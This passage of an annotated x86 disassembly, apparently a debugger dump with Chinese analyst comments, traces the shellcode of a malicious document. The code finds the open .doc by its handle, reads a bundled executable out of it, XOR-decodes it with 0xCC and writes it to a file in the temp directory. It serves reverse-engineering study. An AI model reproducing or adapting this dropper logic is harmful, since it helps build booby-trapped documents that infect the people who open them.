
```
001B:00170F34  83C001              ADD       EAX,01                 ;

001B:00170F37  8945B8              MOV       [EBP-48],EAX           ;

001B:00170F3A  8B45BC              MOV       EAX,[EBP-44]           ;

001B:00170F3D  0FBE08              MOVSX     ECX,BYTE PTR [EAX]     ;

001B:00170F40  85C9                TEST      ECX,ECX                ;

001B:00170F42  740B                JZ        00170F4F               ;

001B:00170F44  8B45BC              MOV       EAX,[EBP-44]           ;

001B:00170F47  83C001              ADD       EAX,01                 ;

001B:00170F4A  8945BC              MOV       [EBP-44],EAX           ;

001B:00170F4D  EBEB                JMP       00170F3A               ;

001B:00170F4F  8B45BC              MOV       EAX,[EBP-44]           ;

001B:00170F52  83C001              ADD       EAX,01                 ;

001B:00170F55  8945BC              MOV       [EBP-44],EAX           ;

001B:00170F58  EBA0                JMP       00170EFA               ;

001B:00170F5A  8B45BC              MOV       EAX,[EBP-44]

001B:00170F5D  83C001              ADD       EAX,01

001B:00170F60  8945BC              MOV       [EBP-44],EAX

001B:00170F63  C745B801000000      MOV       DWORD PTR [EBP-48],00000001

001B:00170F6A  8B45BC              MOV       EAX,[EBP-44]

001B:00170F6D  0FBE08              MOVSX     ECX,BYTE PTR [EAX]

001B:00170F70  85C9                TEST      ECX,ECX

001B:00170F72  7433                JZ        00170FA7

001B:00170F74  8B45B8              MOV       EAX,[EBP-48]

001B:00170F77  8B4DBC              MOV       ECX,[EBP-44]

001B:00170F7A  894C85C0            MOV       [EAX\*4+EBP-40],ECX

001B:00170F7E  8B45B8              MOV       EAX,[EBP-48]

001B:00170F81  83C001              ADD       EAX,01

001B:00170F84  8945B8              MOV       [EBP-48],EAX

001B:00170F87  8B45BC              MOV       EAX,[EBP-44]

001B:00170F8A  0FBE08              MOVSX     ECX,BYTE PTR [EAX]

001B:00170F8D  85C9                TEST      ECX,ECX

001B:00170F8F  740B                JZ        00170F9C

001B:00170F91  8B45BC              MOV       EAX,[EBP-44]

001B:00170F94  83C001              ADD       EAX,01

001B:00170F97  8945BC              MOV       [EBP-44],EAX

001B:00170F9A  EBEB                JMP       00170F87

001B:00170F9C  8B45BC              MOV       EAX,[EBP-44]

001B:00170F9F  83C001              ADD       EAX,01

001B:00170FA2  8945BC              MOV       [EBP-44],EAX

001B:00170FA5  EBC3                JMP       00170F6A

001B:00170FA7  C745A000980200      MOV       DWORD PTR [EBP-60],00029800

001B:00170FAE  8D853CFBFFFF        LEA       EAX,[EBP+FFFFFB3C]

001B:00170FB4  50                  PUSH      EAX

001B:00170FB5  6800040000          PUSH      00000400

001B:00170FBA  FF55F8              CALL      [EBP-08]          ；取临时目录

001B:00170FBD  8D853CFBFFFF        LEA       EAX,[EBP+FFFFFB3C]

001B:00170FC3  50                  PUSH      EAX

001B:00170FC4  FF55FC              CALL      [EBP-04]          ；改变当前目录

001B:00170FC7  6A00                PUSH      00

001B:00170FC9  6A02                PUSH      02

001B:00170FCB  6A04                PUSH      04

001B:00170FCD  6A00                PUSH      00

001B:00170FCF  6A03                PUSH      03

001B:00170FD1  6800000040          PUSH      40000000 ; STATUS\_OBJECT\_NAME\_EXIST

001B:00170FD6  8B45C4              MOV       EAX,[EBP-3C]

001B:00170FD9  50                  PUSH      EAX

001B:00170FDA  FF55E0              CALL      [EBP-20]          ；创建文件

001B:00170FDD  894590              MOV       [EBP-70],EAX

001B:00170FE0  C7459400000000      MOV       DWORD PTR [EBP-6C],00000000

001B:00170FE7  83459404            ADD       DWORD PTR [EBP-6C],04

001B:00170FEB  6A00                PUSH      00               ;

001B:00170FED  8B4594              MOV       EAX,[EBP-6C]     ;

001B:00170FF0  50                  PUSH      EAX              ;在内存中查

001B:00170FF1  FF55F4              CALL      [EBP-0C]         ;找这个doc

001B:00170FF4  8B4DA0              MOV       ECX,[EBP-60]     ;的handle

001B:00170FF7  81C100020100        ADD       ECX,00010200     ;

001B:00170FFD  3BC1                CMP       EAX,ECX          ;

001B:00170FFF  75E6                JNZ       00170FE7         ;

001B:00171001  6A00                PUSH      00

001B:00171003  6A00                PUSH      00

001B:00171005  6800020100          PUSH      00010200

001B:0017100A  8B4594              MOV       EAX,[EBP-6C]

001B:0017100D  50                  PUSH      EAX

001B:0017100E  FF55E4              CALL      [EBP-1C]         ; 定位文件的位置

001B:00171011  C745A400000000      MOV       DWORD PTR [EBP-5C],00000000

001B:00171018  6A00                PUSH      00                               ;

001B:0017101A  8D45B4              LEA       EAX,[EBP-4C]                     ;从

001B:0017101D  50                  PUSH      EAX                              ;doc

001B:0017101E  6800040000          PUSH      00000400                         ;文档

001B:00171023  8D8D3CFBFFFF        LEA       ECX,[EBP+FFFFFB3C]               ;中

001B:00171029  51                  PUSH      ECX                              ;把

001B:0017102A  8B5594              MOV       EDX,[EBP-6C]                     ;捆绑

001B:0017102D  52                  PUSH      EDX                              ;的

001B:0017102E  FF55D8              CALL      [EBP-28]                         ;哪个

001B:00171031  C78538FBFFFF00000000MOV       DWORD PTR [EBP+FFFFFB38],00000000;exe

001B:0017103B  EB0F                JMP       0017104C                         ;文件

001B:0017103D  8B8538FBFFFF        MOV       EAX,[EBP+FFFFFB38]               ;写入

001B:00171043  83C001              ADD       EAX,01                           ;刚才

001B:00171046  898538FBFFFF        MOV       [EBP+FFFFFB38],EAX               ;创建

001B:0017104C  8B8538FBFFFF        MOV       EAX,[EBP+FFFFFB38]               ;的

001B:00171052  3B45B4              CMP       EAX,[EBP-4C]                     ;哪个

001B:00171055  7323                JAE       0017107A                         ;文件

001B:00171057  8B8538FBFFFF        MOV       EAX,[EBP+FFFFFB38]               ;

001B:0017105D  0FBE8C053CFBFFFF    MOVSX     ECX,BYTE PTR [EAX+EBP+FFFFFB3C]  ;

001B:00171065  81F1CC000000        XOR       ECX,000000CC                     ;

001B:0017106B  8B9538FBFFFF        MOV       EDX,[EBP+FFFFFB38]               ;

001B:00171071  888C153CFBFFFF      MOV       [EDX+EBP+FFFFFB3C],CL            ;

001B:00171078  EBC3                JMP       0017103D                         ;

001B:0017107A  8B45A4              MOV       EAX,[EBP-5C]                     ;

001B:0017107D  0345B4              ADD       EAX,[EBP-4C]                     ;

001B:00171080  8945A4              MOV       [EBP-5C],EAX                     ;

001B:00171083  8B45A4              MOV       EAX,[EBP-5C]                     ;

001B:00171086  3B45A0              CMP       EAX,[EBP-60]                     ;

001B:00171089  7C20                JL        001710AB                         ;

001B:0017108B  6A00                PUSH      00                               ;

001B:0017108D  8D45B0              LEA       EAX,[EBP-50]                     ;

001B:00171090  50                  PUSH      EAX                              ;

001B:00171091  8B4DB4              MOV       ECX,[EBP-4C]                     ;

001B:00171094  034DA0              ADD       ECX,[EBP-60]                     ;

001B:00171097  2B4DA4              SUB       ECX,[EBP-5C]                     ;

001B:0017109A  51                  PUSH      ECX                              ;

001B:0017109B  8D953CFBFFFF        LEA       EDX,[EBP+FFFFFB3C]               ;

001B:001710A1  52                  PUSH      EDX                              ;

001B:001710A2  8B4590              MOV       EAX,[EBP-70]                     ;

001B:001710A5  50                  PUSH      EAX                              ;
```
